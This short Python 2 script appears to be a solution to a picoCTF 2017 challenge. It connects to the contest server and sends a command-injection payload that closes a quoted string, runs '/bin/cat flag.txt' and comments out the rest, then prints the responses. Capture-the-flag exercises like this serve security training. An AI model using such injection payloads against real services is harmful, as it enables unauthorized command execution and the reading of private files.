from socket import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 51865))

s.send("\"; /bin/cat flag.txt #\n");
print s.recv(2048)
print s.recv(2048)

s.close()
